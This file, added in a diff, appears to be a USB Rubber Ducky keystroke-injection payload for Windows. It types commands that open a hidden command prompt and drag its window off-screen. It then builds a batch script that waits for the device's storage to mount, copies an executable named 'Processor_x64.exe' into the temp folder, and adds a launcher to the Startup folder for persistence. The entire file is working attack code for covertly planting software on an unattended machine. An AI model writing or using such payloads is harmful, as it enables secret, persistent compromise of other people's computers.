@@ -1,0 +1,66 @@
+REM Purpose: Wait for ducky mass storage to mount, then copy file to desktop. 
+REM Encoder V2.4
+REM Using the run command for a broader OS base. 
+DEFAULT_DELAY 75
+DELAY 5000
+GUI r
+DELAY 1000
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+DELAY 1000
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+STRING erase /Q RUN-X11-x64.bat
+ENTER
+STRING erase /Q Processor_x64.exe
+ENTER
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+REM DuckyWait.bat
+STRING :while1
+ENTER
+STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set DUCKYdrive=%%d
+ENTER
+STRING if Exist %DUCKYdrive% (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 60
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+STRING set DUCKYdrive=%DUCKYdrive%\Processor\
+ENTER
+STRING copy %DUCKYdrive%RUN-X11-x64.bat %TEMP%\RUN-X11-x64.bat
+ENTER
+STRING copy %DUCKYdrive%Processor_x64.exe %TEMP%\Processor_x64.exe
+ENTER
+STRING copy "%TEMP%\RUN-X11-x64.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
+ENTER
+CONTROL z
+ENTER
+
+REM RUN THE BATCH FILE
+STRING DuckyWait.bat
+ENTER
+DELAY 3500
+STRING Hidden_Script.vbs
+ENTER
+STRING EXIT
+ENTER
+CONTROL z
+ENTER
